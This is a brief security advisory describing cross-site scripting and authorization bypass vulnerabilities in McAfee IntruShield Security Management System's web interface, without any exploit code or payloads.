McAfee IntruShield Security Management System is susceptible to multiple vulnerabilities.

The first two issues are cross-site scripting vulnerabilities in the 'intruvert/jsp/systemHealth/SystemEvent.jsp' script. These issues are due to a failure of the application to properly sanitize user-supplied data prior to utilizing it in dynamically generated HTML.

The next two issues are authorization bypass vulnerabilities leading to information disclosure and the ability to acknowledge, de-acknowledge, and delete security alerts.

These vulnerabilities require a valid user account in the affected application.
